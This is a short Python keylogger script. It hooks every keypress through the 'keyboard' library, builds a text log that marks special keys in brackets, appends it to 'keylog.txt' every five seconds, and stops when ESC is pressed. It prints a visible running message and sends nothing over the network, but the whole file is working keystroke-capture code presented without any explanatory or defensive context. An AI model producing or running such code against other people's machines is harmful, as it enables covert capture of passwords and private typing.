import keyboard
import time

log = ""
log_file = "keylog.txt"
flush_interval = 5  # seconds
last_flush_time = time.time()

def on_press(e):
    global log, last_flush_time

    key = e.name

    if key == "space":
        log += " "
    elif len(key) == 1:
        log += key
    else:
        log += f"[{key}]"

    # Flush log to file every flush_interval seconds
    if time.time() - last_flush_time >= flush_interval:
        save_log()
        last_flush_time = time.time()

def save_log():
    global log
    if log:
        try:
            with open(log_file, "a+", encoding="utf-8") as f:
                f.write(log)
            log = ""
        except Exception as e:
            print(f"Error writing to log file: {e}")

keyboard.on_press(on_press)

print("Keylogger is running... Press ESC to stop.")
keyboard.wait("esc")
save_log()  # Final save on exit
